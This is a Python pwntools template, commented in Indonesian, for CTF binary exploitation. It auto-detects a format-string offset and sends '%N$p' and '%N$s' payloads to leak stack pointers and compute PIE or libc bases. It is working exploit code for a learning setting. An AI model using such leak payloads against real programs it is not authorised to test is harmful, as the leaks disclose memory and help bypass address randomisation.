#!/usr/bin/env python3
"""
Flexible Format String Leak Framework
=======================================
Untuk CTF binary exploitation - fokus INFO LEAK (%p / %s).
Didesain fleksibel: kamu tinggal edit bagian CONFIG & INTERAKSI,
gak perlu tulis ulang logic parsing/brute-force offset.

Alur:
  1. Definisikan cara program "sampai" ke titik rentan (menu, dsb) -> reach_vuln()
  2. Auto-detect offset (brute force %p sampai ketemu pattern kita)
  3. Leak value di offset manapun yang kamu mau
"""

from pwn import *
import re

# ============================================================
# CONFIG - SESUAIKAN PER BINARY
# ============================================================
BINARY   = './chall'
HOST     = 'localhost'
PORT     = 1337
REMOTE   = False

context.log_level = 'info'   # ganti 'debug' buat lihat semua I/O mentah

def start():
    if REMOTE:
        return remote(HOST, PORT)
    return process(BINARY)


# ============================================================
# REACH_VULN — edit sesuai alur binary (menu, prompt, dsb)
# ============================================================
def reach_vuln(io):
    """
    Bawa program sampai ke titik yang nunggu input format string kita.
    Contoh-contoh pola umum di bawah, tinggal uncomment/edit yang cocok.
    Kalau gak yakin alurnya, jalankan io.interactive() dulu manual
    buat lihat prompt-prompt yang muncul.
    """

    # --- Contoh 1: langsung minta input, gak ada menu ---
    # io.recvuntil(b'Input: ')   # sesuaikan teks prompt-nya

    # --- Contoh 2: ada menu, harus pilih opsi dulu ---
    # io.recvuntil(b'>> ')
    # io.sendline(b'1')          # pilih menu "1" misal buat trigger vuln
    # io.recvuntil(b'Enter data: ')

    # --- Contoh 3: banyak langkah / looping ---
    # for _ in range(3):
    #     io.recvuntil(b'>> ')
    #     io.sendline(b'2')

    pass  # HAPUS kalau sudah diisi


# ============================================================
# AUTO-DETECT OFFSET
# ============================================================
def find_offset(binary_path, reach_fn, marker=b'AAAAAAAA', max_offset=30):
    """
    Brute-force offset dengan restart proses tiap percobaan (fresh state).
    marker: pattern unik 8 byte, hasil hex-nya dicari di leak.
    Return offset pertama yang match, atau None kalau gak ketemu.
    """
    marker_hex = marker.hex()  # representasi hex yg dicari di %p leak
    log.info(f"Mencari offset, marker hex target: {marker_hex}")

    for offset in range(1, max_offset):
        io = process(binary_path)
        try:
            reach_fn(io)
            payload = marker + f'.%{offset}$p'.encode()
            io.sendline(payload)
            output = io.recvall(timeout=1)
        except EOFError:
            output = b''
        io.close()

        if marker_hex.encode() in output or marker in output:
            log.success(f"Offset ditemukan: {offset}")
            return offset

    log.warning("Offset tidak ditemukan di range yang dicoba, perbesar max_offset")
    return None


# ============================================================
# LEAK — generic, terima format spesifier apapun (%p/%s/%x)
# ============================================================
def leak(io, offset, spec='p'):
    """
    Kirim %OFFSET$SPEC dan parse hasilnya.
    spec: 'p' (pointer/hex), 's' (string), 'x' (hex tanpa 0x)
    """
    payload = f'%{offset}${spec}'.encode()
    io.sendline(payload)
    out = io.recvline(timeout=2)
    log.info(f"Raw leak offset {offset}: {out}")

    if spec in ('p', 'x'):
        match = re.search(rb'0x[0-9a-fA-F]+', out)
        if match:
            val = int(match.group(), 16)
            log.success(f"[offset {offset}] -> {hex(val)}")
            return val
    return out  # untuk %s balikin raw bytes string-nya


def leak_range(io, start, end, spec='p'):
    """Leak banyak offset sekaligus, berguna buat scan area stack."""
    results = {}
    for off in range(start, end + 1):
        results[off] = leak(io, off, spec)
    return results


# ============================================================
# MAIN
# ============================================================
def main():
    # --- Langkah 1: kalau belum tau offset, cari dulu ---
    # offset = find_offset(BINARY, reach_vuln)
    # if offset is None:
    #     return

    offset = 6  # GANTI setelah tau hasil find_offset()

    io = start()
    reach_vuln(io)

    # --- Langkah 2: leak satu nilai spesifik ---
    val = leak(io, offset, spec='p')

    # --- Atau scan banyak offset sekaligus buat eksplorasi awal ---
    # results = leak_range(io, 1, 20, spec='p')
    # for off, v in results.items():
    #     print(off, hex(v) if isinstance(v, int) else v)

    # --- Kalau leak-nya alamat libc/PIE, hitung base-nya di sini ---
    # elf = ELF(BINARY)
    # pie_base = val - elf.symbols['some_func']
    # log.info(f"PIE base: {hex(pie_base)}")

    io.interactive()


if __name__ == '__main__':
    main()
